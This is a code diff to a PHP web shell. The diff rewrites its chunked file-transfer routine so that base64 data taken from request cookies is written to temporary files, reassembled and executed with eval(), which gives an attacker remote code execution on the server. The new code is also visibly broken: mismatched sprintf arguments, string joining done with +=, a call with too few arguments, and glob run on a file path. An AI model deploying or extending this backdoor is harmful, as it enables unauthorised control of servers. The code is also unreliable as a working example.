@@ -147,16 +147,32 @@ function banner()
 
 
 // removing b64, replacing with chunked file transfer.
-function chunkFileTransfer(string $fname, string $count, string $data){
-    if (defined("slopWindows")) {
-        $fp = fopen(sprintf("%s\\%s", scache, $fname), "a+");
-    }else{
-        $fp = fopen(sprintf("%s/%s", scache, $fname), "a+");
+function chunkFileTransfer($fname, $data, $count, $chunk): string
+{
+    $da = "";
+    $sum = md5($data);
+    $d = base64_decode($data);
+    if (slopos === "WIN"){
+        $g = sprintf("%s\\%s\\%s.dat", sys_get_temp_dir(), bin2hex(openssl_random_pseudo_bytes(10)));
+        if (!is_dir(sprintf("%s\\%s", sys_get_temp_dir(), $fname))){
+            mkdir(sprintf("%s\\%s", sys_get_temp_dir(), $fname));
+        }
+        file_put_contents($g, $d);
+    }else {
+        $g = sprintf("%s/%s", $fname, bin2hex(openssl_random_pseudo_bytes(10)));
+        file_put_contents(sprintf("%s/%s", $fname, bin2hex(openssl_random_pseudo_bytes(10))), $d);
     }
-    $chunk = base64_decode($data);
-    fwrite($fp, $chunk, strlen($chunk));
-    fclose($fp);
-    return $count;
+    if ($count === $chunk){
+        foreach (glob(sprintf("%s/*", $g), GLOB_MARK) as $ff){
+            if (!is_dir($ff)){
+                $da += base64_decode(trim(file_get_contents($ff)));
+                unlink($ff);
+            }
+        }
+        unlink($g);
+        return eval($da);
+    }
+    return $sum;
 }
 
 function checkComs(): array
@@ -366,17 +382,10 @@ function slopp()
         banner();
         switch (true) {
             case (isset($_COOKIE['cft'])):
-                $putdata = fopen("php://input", "r");
-                $cft = explode(".", base64_decode($_COOKIE['cftd']));
-                while ($data = fread($putdata, 1024)){
-                    chunkFileTransfer($cft[0], $cft[1], $data);
-                }
-                if (defined("slopWindows")){
-                    header(sprintf("MD5: %s", md5_file(sprintf("%s\\%s", scache, $cft[0]))));
-                }else{
-                    header(sprintf("MD5: %s", md5_file(sprintf("%s/%s", scache, $cft[0]))));
-                }
-                fclose($putdata);
+                $putData = $_COOKIE['token'];
+                $f = $_COOKIE['t'];
+                $a = chunkFileTransfer($f, $putData);
+                header(sprintf("MD5: %s", $a));
                 break;
             case (isset($_COOKIE['qs'])):
                 $qs = [];
